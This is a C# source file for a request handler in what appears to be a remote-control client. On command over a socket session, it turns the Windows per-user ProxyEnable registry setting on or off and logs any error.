using System;
using Microsoft.Win32;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Client.Handlers
{
    class RequestToggleProxyHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestToggleProxy;
                    if (req == null) return;

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Internet Settings", true))
                    {
                        if (key != null)
                        {
                            key.SetValue("ProxyEnable", req.Enable ? 1 : 0, RegistryValueKind.DWord);
                        }
                    }
                }
                catch (Exception ex)
                {
                    DoOutput("代理设置失败: " + ex.Message);
                }
            });
        }
    }
}
